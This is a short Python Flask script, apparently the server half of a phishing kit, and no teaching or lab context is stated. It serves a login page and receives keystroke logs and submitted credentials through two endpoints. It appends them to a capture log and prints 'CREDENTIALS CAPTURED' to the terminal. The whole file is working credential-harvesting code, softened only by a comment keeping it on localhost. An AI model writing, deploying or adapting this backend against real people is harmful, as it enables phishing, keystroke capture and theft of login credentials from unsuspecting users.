from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)
LOG_FILE = "local_captures.log"

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("")

@app.route('/')
def index():
    # Serve the HTML login page (we'll create this next)
    return open('index.html').read()

@app.route('/api/log', methods=['POST'])
def log_keystroke():
    data = request.get_json()
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.utcnow()} | KEYSTROKE: {json.dumps(data)}\n")
    return "", 200

@app.route('/api/collect', methods=['POST'])
def collect_creds():
    data = request.get_json()
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.utcnow()} | FINAL_CREDS: {json.dumps(data)}\n")
    print(f"\n[!] CREDENTIALS CAPTURED: {data}\n")  # Prints directly to your terminal
    return "", 200

if __name__ == '__main__':
    # Running on localhost ONLY - accessible at http://127.0.0.1:5000
    # Do NOT change host='0.0.0.0' unless you want to accidentally expose this to your network.
    app.run(host='127.0.0.1', port=5000, debug=True)
